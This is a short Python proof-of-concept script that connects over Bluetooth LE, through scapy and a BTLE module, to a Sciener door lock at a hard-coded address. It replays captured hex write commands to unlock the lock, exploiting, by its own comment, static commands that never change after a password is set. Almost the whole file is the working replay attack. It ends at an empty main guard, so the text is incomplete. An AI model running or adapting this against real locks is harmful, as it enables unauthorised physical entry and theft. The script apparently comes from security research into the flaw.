#!/bin/python

# Unlock Sciener Doorlock
# "Encrypted" communication using the doorlock that is vulnerable to a replay attack
# The commands never change once a password is established.


import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "CC9E4704A578",rand)

	writereq(s, "2c00","7f5a0141410a0f0b0a0f0d060e0e070d560d0a")	
	writereq(s, "2c00","7f5a0147180c8e82838b89828e8f82bb9b89f10d")

	writereq(s, "2c00","0a")
	writereq(s, "2c00","7f5a0143650a2a2d2b2f2a2d2b2a2a291d0d0a")


	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
